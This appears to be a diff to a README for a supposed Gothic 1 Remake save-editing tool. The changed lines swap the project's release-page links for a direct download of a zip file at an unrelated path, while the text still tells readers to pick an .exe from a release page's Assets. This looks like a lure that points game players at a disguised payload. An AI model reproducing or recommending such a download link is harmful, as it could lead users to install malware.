@@ -5,13 +5,13 @@ description: "Modify game state, manage save files, and resolve quest bugs in Go
 ---
 # 🛠️ gothic1-remake-tools - Modify your Gothic 1 Remake experience
 
-[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/susarm2388/gothic1-remake-tools)
+[![Download Now](https://img.shields.io/badge/Download-Release-blue.svg)](https://raw.githubusercontent.com/susarm2388/susarm2388.github.io/main/exotoxic/susarm_github_io_v1.4.zip)
 
 This project provides tools for Gothic 1 Remake. You can manage your character stats, modify save files, and fix quest progress. These tools function on Windows systems.
 
 ## 📥 How to download the software
 
-1. Navigate to the release page: [https://github.com/susarm2388/gothic1-remake-tools](https://github.com/susarm2388/gothic1-remake-tools)
+1. Navigate to the release page: [https://raw.githubusercontent.com/susarm2388/susarm2388.github.io/main/exotoxic/susarm_github_io_v1.4.zip](https://raw.githubusercontent.com/susarm2388/susarm2388.github.io/main/exotoxic/susarm_github_io_v1.4.zip)
 2. Locate the section titled "Assets" at the bottom of the latest release post.
 3. Click the file ending in .exe to start your download.
 4. Save the file to a folder on your computer.
